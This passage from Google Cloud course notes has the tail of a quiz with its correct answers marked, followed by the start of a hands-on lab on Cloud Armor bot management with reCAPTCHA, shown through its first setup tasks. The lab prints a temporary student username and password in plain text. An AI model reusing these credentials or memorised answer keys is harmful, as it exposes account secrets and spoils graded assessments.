with assets.</span></p><p><span>Correct! Security Command Center requires only two IAM administrative permissions to set up—Organization Administrator and Security Center Admin roles.</span></p></li></ul><ol start='4' ><li><p><span>Which TWO of the following statements about Cloud Monitoring and Cloud Logging are TRUE?</span></p></li></ol><ul><li><p><span>While Cloud Logging is not built-in to most Google Cloud services, you can easily add it for a reasonable fee.</span></p></li><li><p><strong><span>You can analyze log data in BigQuery.</span></strong></p><p><span>Correct! This feature allows you to create sophisticated log analysis reports.</span></p></li><li><p><strong><span>The Cloud Logging Agent can be installed on both Compute Engine and AWS EC2 instances.</span></strong></p><p><span>Correct! This allows you to stream logs from third-party applications into Cloud Logging.</span></p></li><li><p><span>Cloud Monitoring and Cloud Logging retain logs for an indefinite period of time.</span></p></li></ul><p>&nbsp;</p><h1 id='securing-your-network-with-cloud-armor'><span>Securing your Network with Cloud Armor</span></h1><h2 id='lab---bot-management-with-google-cloud-armor-and-recaptcha'><span>LAB - Bot Management with Google Cloud Armor and reCAPTCHA</span></h2><h3 id='overview-24'><span>Overview</span></h3><p><span>Google Cloud HTTP(S) load balancing is deployed at the edge of Google&#39;s network in Google points of presence (POP) around the world. User traffic directed to an HTTP(S) load balancer enters the POP closest to the user and is then load balanced over Google&#39;s global network to the closest backend that has sufficient capacity available.</span></p><p><span>Cloud Armor is Google&#39;s distributed denial of service and web application firewall (WAF) detection system. Cloud Armor is tightly coupled with the Google Cloud HTTP Load Balancer and safeguards applications of Google Cloud customers from attacks from the internet.</span></p><p><a href='https://cloud.google.com/recaptcha-enterprise/docs'><span>reCAPTCHA Enterprise</span></a><span> is a service that builds on the reCAPTCHA API and protects your site from spam and abuse using advanced risk analysis techniques to tell humans and bots apart. Cloud Armor Bot Management provides an end-to-end solution integrating reCAPTCHA Enterprise bot detection and scoring with enforcement by Cloud Armor at the edge of the network to protect downstream applications.</span></p><p><span>In this lab, you configure an HTTP Load Balancer with a backend, as shown in the diagram below. You set up a reCAPTCHA session token site key and embed it in your website. You also set up redirection to reCAPTCHA Enterprise manual challenge. You then configure a Cloud Armor bot management policy to see how bot detection protects your application from malicious bot traffic.</span></p><p><img src="images/2kXQgNWkDCt0e9E84gvWp1ZIZrQg5kdhgkF2uWghtlI%3D.png" referrerpolicy="no-referrer" alt="HTTP Load Balancer configuration diagram"></p><h3 id='what-youll-learn-2'><span>What you&#39;ll learn</span></h3><p><span>In this lab, you learn how to:</span></p><ul><li><p><span>Set up a HTTP Load Balancer with appropriate health checks</span></p></li><li><p><span>Create a reCAPTCHA WAF challenge-page site key and associated it with Cloud Armor security policy</span></p></li><li><p><span>Create a reCAPTCHA session token site key and install it on your web pages</span></p></li><li><p><span>Create a Cloud Armor bot management policy</span></p></li><li><p><span>Validate that the bot management policy is handling traffic based on the rules configured</span></p></li></ul><h3 id='setup-and-requirements-21'><span>Setup and requirements</span></h3><h3 id='before-you-click-the-start-lab-button-7'><span>Before you click the Start Lab button</span></h3><p><span>Read these instructions. Labs are timed and you cannot pause them. The timer, which starts when you click </span><strong><span>Start Lab</span></strong><span>, shows how long Google Cloud resources are made available to you.</span></p><p><span>This hands-on lab lets you do the lab activities in a real cloud environment, not in a simulation or demo environment. It does so by giving you new, temporary credentials you use to sign in and access Google Cloud for the duration of the lab.</span></p><p><span>To complete this lab, you need:</span></p><ul><li><p><span>Access to a standard internet browser (Chrome browser recommended).</span></p></li></ul><p><strong><span>Note:</span></strong><span> Use an Incognito (recommended) or private browser window to run this lab. This prevents conflicts between your personal account and the student account, which may cause extra charges incurred to your personal account.</span></p><ul><li><p><span>Time to complete the lab—remember, once you start, you cannot pause a lab.</span></p></li></ul><p><strong><span>Note:</span></strong><span> Use only the student account for this lab. If you use a different Google Cloud account, you may incur charges to that account.</span></p><h3 id='how-to-start-your-lab-and-sign-in-to-the-google-cloud-console-3'><span>How to start your lab and sign in to the Google Cloud console</span></h3><ol start='' ><li><p><span>Click the </span><strong><span>Start Lab</span></strong><span> button. If you need to pay for the lab, a dialog opens for you to select your payment method. On the left is the Lab Details pane with the following:</span></p><ul><li><p><span>The Open Google Cloud console button</span></p></li><li><p><span>Time remaining</span></p></li><li><p><span>The temporary credentials that you must use for this lab</span></p></li><li><p><span>Other information, if needed, to step through this lab</span></p></li></ul></li><li><p><span>Click </span><strong><span>Open Google Cloud console</span></strong><span> (or right-click and select </span><strong><span>Open Link in Incognito Window</span></strong><span> if you are running the Chrome browser).</span></p><p><span>The lab spins up resources, and then opens another tab that shows the Sign in page.</span></p><p><span>*</span><strong><span>Tip:</span><span>*</span></strong><span> Arrange the tabs in separate windows, side-by-side.</span></p><p><strong><span>Note:</span></strong><span> If you see the </span><strong><span>Choose an account</span></strong><span> dialog, click </span><strong><span>Use Another Account</span></strong><span>.</span></p></li><li><p><span>If necessary, copy the </span><strong><span>Username</span></strong><span> below and paste it into the </span><strong><span>Sign in</span></strong><span> dialog.</span></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">student-02-21eef573fe2f@qwiklabs.net</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copied!</span></p><p><span>You can also find the Username in the Lab Details pane.</span></p></li><li><p><span>Click </span><strong><span>Next</span></strong><span>.</span></p></li><li><p><span>Copy the </span><strong><span>Password</span></strong><span> below and paste it into the </span><strong><span>Welcome</span></strong><span> dialog.</span></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">FIduoI7qcGGe</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copied!</span></p><p><span>You can also find the Password in the Lab Details pane.</span></p></li><li><p><span>Click </span><strong><span>Next</span></strong><span>.</span></p><p><strong><span>Important:</span></strong><span> You must use the credentials the lab provides you. Do not use your Google Cloud account credentials.</span></p><p><strong><span>Note:</span></strong><span> Using your own Google Cloud account for this lab may incur extra charges.</span></p></li><li><p><span>Click through the subsequent pages:</span></p><ul><li><p><span>Accept the terms and conditions.</span></p></li><li><p><span>Do not add recovery options or two-factor authentication (because this is a temporary account).</span></p></li><li><p><span>Do not sign up for free trials.</span></p></li></ul></li></ol><p><span>After a few moments, the Google Cloud console opens in this tab.</span></p><p><strong><span>Note:</span></strong><span> To access Google Cloud products and services, click the </span><strong><span>Navigation menu</span></strong><span> or type the service or product name in the </span><strong><span>Search</span></strong><span> field. </span><img src="images/9Fk8NYFp3quE9mF%2FilWF6%2FlXY9OUBi3UWtb2Ne4uXNU%3D.png" referrerpolicy="no-referrer" alt="Navigation menu icon and Search field"></p><h3 id='before-you-begin-2'><span>Before you begin</span></h3><ul><li><p><span>In Cloud Shell, set up your project ID:</span></p></li></ul><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">export PROJECT_ID=$(gcloud config get-value project)</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">echo $PROJECT_ID</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gcloud config set project $PROJECT_ID</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 68px;"></div><div class="CodeMirror-gutters" style="display: none; height: 68px;"></div></div></div></pre><p><span>Copied!</span></p><h3 id='enable-apis'><span>Enable APIs</span></h3><ul><li><p><span>Enable all necessary services:</span></p></li></ul><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gcloud services enable compute.googleapis.com</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gcloud services enable logging.googleapis.com</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gcloud services enable monitoring.googleapis.com</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gcloud services enable recaptchaenterprise.googleapis.com</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 90px;"></div><div class="CodeMirror-gutters" style="display: none; height: 90px;"></div></div></div></pre><p><span>Copied!</span></p><p><span>You&#39;re now set up to begin the first task.</span></p><h3 id='task-1-configure-firewall-rules-to-allow-http-and-ssh-traffic-to-backends'><span>Task 1. Configure firewall rules to allow HTTP and SSH traffic to backends</span></h3><p><span>For this lab, you use the *</span><strong><span>default</span><span>*</span></strong><span> VPC network created in your project when the lab spun up.</span></p><p><span>In this section, you configure firewall rules to allow HTTP traffic to the backends from the Google Cloud health checks and the Load Balancer. You then configure a firewall rule to allow SSH into the instances.</span></p><h5 id='create-a-firewall-rule-to-allow-http-traffic-to-the-backends'><span>Create a firewall rule to allow HTTP traffic to the backends.</span></h5><p><span>Health checks determine which instances of a load balancer can receive new connections. For HTTP load balancing, the health check probes to your load balanced instances come from addresses in the ranges </span><strong><span>130.211.0.0/22 and 35.191.0.0/16</span></strong><span>. Your VPC firewall rules must allow these connections. Also, the load balancers talk to the backend on the same IP range.</span></p><p><span>To create a firewall rule to allow HTTP traffic to the backends:</span></p><ol start='' ><li><p><span>In the console, navigate to </span><strong><span>Navigation menu (</span><img src="https://cdn.qwiklabs.com/tkgw1TDgj4Q%2BYKQUW4jUFd0O5OEKlUMBRYbhlCrF0WY%3D" referrerpolicy="no-referrer" alt="Navigation menu icon"><span>) &gt; VPC network &gt; Firewall</span></strong><span>.</span></p></li><li><p><span>Notice the existing </span><strong><span>ICMP</span></strong><span>, </span><strong><span>internal</span></strong><span>, </span><strong><span>RDP</span></strong><span>, and </span><strong><span>SSH</span></strong><span> firewall rules. Each Google Cloud project starts with the default network and these firewall rules.</span></p></li><li><p><span>Click </span><strong><span>Create Firewall Rule</span></strong><span>.</span></p></li><li><p><span>Set the following values, leave all other values at their defaults:</span></p></li></ol><figure class='table-figure'><table><thead><tr><th style='text-align:left;' ><span>Property</span></th><th style='text-align:left;' ><span>Value (type value or select option as specified)</span></th></tr></thead><tbody><tr><td style='text-align:left;' ><strong><span>Name</span></strong></td><td style='text-align:left;' ><span>default-allow-health-check</span></td></tr><tr><td style='text-align:left;' ><strong><span>Network</span></strong></td><td style='text-align:left;' ><span>default</span></td></tr><tr><td style='text-align:left;' ><strong><span>Targets</span></strong></td><td style='text-align:left;' ><span>Specified target tags</span></td></tr><tr><td style='text-align:left;' ><strong><span>Target tags</span></strong></td><td style='text-align:left;' ><span>allow-health-check</span></td></tr><tr><td style='text-align:left;' ><strong><span>Source filter</span></strong></td><td style='text-align:left;' ><span>IPv4 Ranges</span></td></tr><tr><td style='text-align:left;' ><strong><span>Source IPv4 ranges</span></strong></td><td style='text-align:left;' ><span>130.211.0.0/22, 35.191.0.0/16</span></td></tr><tr><td style='text-align:left;' ><strong><span>Protocols and ports</span></strong></td><td style='text-align:left;' ><span>Specified protocols and ports, and then check </span><code>tcp</code><span>. Type </span><code>80</code><span> for the port number</span></td></tr></tbody></table></figure><p><strong><span>Note:</span></strong><span> Be sure to enter the two </span><strong><span>Source IPv4 ranges</span></strong><span> one-by-one and press SPACE in between them.</span></p><ol start='' ><li><p><span>Click </span><strong><span>Create</span></strong><span>.</span></p></li></ol><p><span>Alternatively, in the gCloud command line, use the following command:</span></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gcloud compute firewall-rules create default-allow-health-check --direction=INGRESS --priority=1000 --network=default --action=ALLOW --rules=tcp:80 --source-ranges=130.211.0.0/22,35.191.0.0/16 --target-tags=allow-health-check</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 68px;"></div><div class="CodeMirror-gutters" style="display: none; height: 68px;"></div></div></div></pre><p><span>Copied!</span></p><ol start='' ><li><p><span>Similarly, create a firewall rule to allow SSH-ing into the instances:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gcloud compute firewall-rules create allow-ssh --direction=INGRESS --priority=1000 --network=default --action=ALLOW --rules=tcp:22 --source-ranges=0.0.0.0/0 --target-tags=allow-health-check</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 45px;"></div><div class="CodeMirror-gutters" style="display: none; height: 45px;"></div></div></div></pre><p><span>Copied!</span></p><p><span>Click </span><strong><span>Check my progress</span></strong><span> to verify the objective.</span></p><p><span>Configure firewall rules to allow HTTP and SSH traffic to backends</span></p><p>&nbsp;</p><p><span>Check my progress</span></p><p>&nbsp;</p><h3 id='task-2-configure-instance-templates-and-create-managed-instance-groups'><span>Task 2. Configure instance templates and create managed instance groups</span></h3><p><span>A managed instance group uses an instance template to create a group of identical instances. Use these to create the backend of the HTTP Load Balancer.</span></p><h4 id='configure-the-instance-templates'><span>Configure the instance templates</span></h4><p><span>An instance template is a resource that you use to create VM instances and managed instance groups. Instance templates define the machine type, boot disk image, subnet, labels, and other instance properties.</span></p><p><span>To create an instance template:</span></p><ol start='' ><li><p><span>In the console, navigate to </span><strong><span>Navigation menu (</span><img src="https://cdn.qwiklabs.com/tkgw1TDgj4Q%2BYKQUW4jUFd0O5OEKlUMBRYbhlCrF0WY%3D" referrerpolicy="no-referrer" alt="Navigation menu icon"><span>) &gt; Compute Engine &gt; Instance templates</span></strong><span>, and then click </span><strong><span>Create instance template</span></strong><span>.</span></p></li><li><p><span>For </span><strong><span>Name</span></strong><span>, type </span><strong><span>lb-backend-template</span></strong><span>.</span></p></li><li><p><span>For </span><strong><span>Location</span></strong><span>, Select </span><strong><span>Global</span></strong><span>.</span></p></li><li><p><span>For Series, select </span><strong><span>N1</span></strong><span>.</span></p></li><li><p><span>Click </span><strong><span>Networking, Disks, Security, Management, Sole-Tenancy</span></strong><span> under </span><strong><span>Advanced options</span></strong><span>.</span></p></li><li><p><span>Go to the </span><strong><span>Management</span></strong><span> section and insert the following script into the </span><strong><span>Startup script</span></strong><span> field:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">#! /bin/bash</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">sudo apt-get update</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">sudo apt-get install apache2 -y</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">sudo a2ensite default-ssl</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">sudo a2enmod ssl</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">sudo su</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">vm_hostname="$(curl -H "Metadata-Flavor:Google" \</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">http://metadata.google.internal/computeMetadata/v1/instance/name)"</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">echo "Page served from: $vm_hostname" | \</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">tee /var/www/html/index.html</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 225px;"></div><div class="CodeMirror-gutters" style="display: none; height: 225px;"></div></div></div></pre><p><span>Copied!</span></p><ol start='' ><li><p><span>Click on the </span><strong><span>Networking</span></strong><span> tab and add the network tag: </span><strong><span>allow-health-check</span></strong></p></li><li><p><span>Set the following values and leave all other values at their defaults:</span></p></li></ol><figure class='table-figure'><table><thead><tr><th style='text-align:left;' ><span>Property</span></th><th style='text-align:left;' ><span>Value (type value or select option as specified)</span></th></tr></thead><tbody><tr><td style='text-align:left;' ><strong><span>Network (Under Network Interfaces)</span></strong></td><td style='text-align:left;' ><span>default</span></td></tr><tr><td style='text-align:left;' ><strong><span>Subnetwork (Under Network Interfaces)</span></strong></td><td style='text-align:left;' ><span>default (</span><code>us-central1</code><span>)</span></td></tr><tr><td style='text-align:left;' ><strong><span>Network tags</span></strong></td><td style='text-align:left;' ><span>allow-health-check</span></td></tr></tbody></table></figure><p><strong><span>Note:</span></strong><span> The network tag </span><strong><span>allow-health-check</span></strong><span> ensures that the HTTP Health Check and SSH firewall rules apply to these instances.</span></p><ol start='' ><li><p><span>Click </span><strong><span>Create</span></strong><span>.</span></p></li></ol><p><span>Wait for the instance template to be created.</span></p><h4 id='create-the-managed-instance-group'><span>Create the managed instance group</span></h4><p><span>To Create the managed instance group:</span></p><ol start='' ><li><p><span>Still in </span><strong><span>Compute Engine</span></strong><span> page, click </span><strong><span>Instance groups</span></strong><span> in the left pane.</span></p></li><li><p><span>Click </span><strong><span>Create instance group</span></strong><span>.</span></p></li><li><p><span>Select </span><strong><span>New managed instance group (stateless)</span></strong><span>.</span></p></li><li><p><span>Set the following values, leave all other values at their defaults:</span></p></li></ol><figure class='table-figure'><table><thead><tr><th style='text-align:left;' ><span>Property</span></th><th style='text-align:left;' ><span>Value (type value or select option as specified)</span></th></tr></thead><tbody><tr><td style='text-align:left;' ><strong><span>Name</span></strong></td><td style='text-align:left;' ><span>lb-backend-example</span></td></tr><tr><td style='text-align:left;' ><strong><span>Location</span></strong></td><td style='text-align:left;' ><span>Single zone</span></td></tr><tr><td style='text-align:left;' ><strong><span>Region</span></strong></td><td style='text-align:left;' ><code>us-central1</code></td></tr><tr><td style='text-align:left;' ><strong><span>Zone</span></strong></td><td style='text-align:left;' ><code>us-central1-c</code></td></tr><tr><td style='text-align:left;' ><strong><span>Instance template</span></strong></td><td style='text-align:left;' ><span>lb-backend-template</span></td></tr><tr><td style='text-align:left;' ><strong><span>Autoscaling</span></strong></td><td style='text-align:left;' ><span>Set </span><strong><span>Autoscaling mode</span></strong><span> to </span><strong><span>Off: do not autoscale</span></strong></td></tr><tr><td style='text-align:left;' ><strong><span>Minimum number of instance</span></strong></td><td style='text-align:left;' ><span>1</span></td></tr></tbody></table></figure><ol start='' ><li><p><span>Click </span><strong><span>Create</span></strong><span>.</span></p></li></ol><h4 id='add-a-named-port-to-the-instance-group'><span>Add a named port to the instance group</span></h4><ul><li><p><span>For your instance group, in Cloud Shell, define an HTTP service and map a port name to the relevant port:</span></p></li></ul><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gcloud compute instance-groups set-named-ports lb-backend-example \</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">--named-ports http:80 \</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">--zone &lt;var&gt;us-central1-c&lt;/var&gt;</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 68px;"></div><div class="CodeMirror-gutters" style="display: none; height: 68px;"></div></div></div></pre><p><span>Copied!</span></p><p><span>The load balancing service forwards traffic to the named port.</span></p><p><span>Click </span><strong><span>Check my progress</span></strong><span> to verify the objective.</span></p><p><span>Configure instance templates and create managed instance groups</span></p><p>&nbsp;</p><p><span>Check my progress</span></p><p>&nbsp;</p><h3 id='task-3-configure-the-http-load-balancer'><span>Task 3. Configure the HTTP Load Balancer</span></h3><p><span>In this section, you configure the HTTP Load Balancer to send traffic to your backend 